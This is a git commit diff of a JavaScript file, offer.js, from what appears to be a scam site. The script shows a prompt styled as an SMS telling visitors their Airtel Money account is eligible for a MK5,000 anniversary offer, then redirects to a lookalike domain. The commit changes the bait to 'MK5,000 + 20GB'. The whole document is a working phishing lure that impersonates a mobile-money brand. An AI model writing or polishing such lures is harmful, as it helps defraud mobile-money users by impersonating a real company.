b3e98b89a09384479aa85e3f03ba0ac620597dd6
essac5523me <essac5523+me@gmail.com>
2025-04-27 02:52:20 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = 'MK5,000'
-password=prompt('SMS: Congratulations Your Airtel Money Account is Eligible to receive MK5,000 MoMo Anniversary Offer, Kindly Press OK to PROCEED  ','MK5,000');
+password=prompt('SMS: Congratulations Your Airtel Money Account is Eligible to receive MK5,000 + 20GB Anniversary Celebration Offer, Kindly Press OK to PROCEED  ','MK5,000');
 if (password != 'MK5,000') {
 location.href='https://airtel-money.allprogram.site/gift';
 }
